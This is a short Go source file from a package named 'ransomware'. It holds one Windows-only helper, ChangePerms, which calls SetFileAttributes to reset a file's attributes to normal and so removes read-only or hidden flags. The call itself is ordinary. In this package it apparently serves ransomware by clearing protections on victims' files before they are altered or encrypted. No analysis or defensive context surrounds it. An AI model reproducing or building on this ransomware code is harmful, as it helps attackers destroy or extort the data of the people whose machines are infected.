//go:build windows
// +build windows

package ransomware

import (
	"syscall"
)

func ChangePerms(file string) error {
	filenameW, err := syscall.UTF16PtrFromString(file)
	syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_NORMAL)

	return err
}
